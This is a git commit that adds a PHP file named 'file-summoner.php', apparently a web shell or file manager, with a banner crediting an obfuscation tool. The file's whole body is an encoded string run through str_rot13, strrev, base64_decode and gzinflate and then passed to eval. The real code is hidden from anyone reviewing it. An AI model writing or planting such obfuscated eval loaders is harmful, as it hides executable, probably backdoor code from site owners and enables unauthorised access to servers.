67c9c51bfb378ab785a05a5654ca8c13be073956
Mhankk <57066081+Mhankk@users.noreply.github.com>
2021-09-06 21:18:13 +0700

    Create file-summoner.php

---
+++ Mini/file-summoner.php
@@ -0,0 +1,14 @@
+<?php
+/*
+                     The Given Code Was Successfully Obfuscated By Mechanical Warn
+                               From : http://localhost/encrypt/mh@nkk.php
+                                                
+                                  Thanks For Using
+                                  
+                         Tools Coded By ./mh@nkk         
+*/
+$mhankk = "=sRjW40aPGbsb4fO9YkuF/lAU8wPnZUpPwnv7wuDqY3TgFX+2BikJ1rBJm2D6WwuZQRWbEQXLHKVHkuqD76hIhaR6xauTrkcM7GNTDuilQ/cz+ThjoFFggmn7fsIwI7+OxpVn5w78sDu8jTbamtYZZO3vQvAu1Cb5af2Tf8j3zCsk1iWbt739UPs55tuLaW7Tf5GBDpgMy7kxtTX9IwPyGlpn/T5awHr8PXDWN3OFP0G+CxOwQ0wQlqF3zsZNBCbiI09OsDw+XWF5riX7bZc54atWVyIgLWSmseGAec0VBUM1gObn9VbIRXHPOdaE0TtYdb2ZyLzuvt00jSad1976Ll0Pj7que5EonNBh0OpQqtnp8iSJ+ORFilEe8B8HxDFANoaBHVjcin/cHwIBwJe+HdAuEg/MHwMB4/xBgTA";
+$Jogja = "==NN1RbDeqJMzGvMxwnnJJnSHpWSdE6caoPcaFpznrdSyHFMvEdyxHrczG25T5FYXuFYC78FAeleVSAmY1lF";
+eval(gzinflate(base64_decode(strrev(str_rot13($Jogja)))));
+exit;
+?>
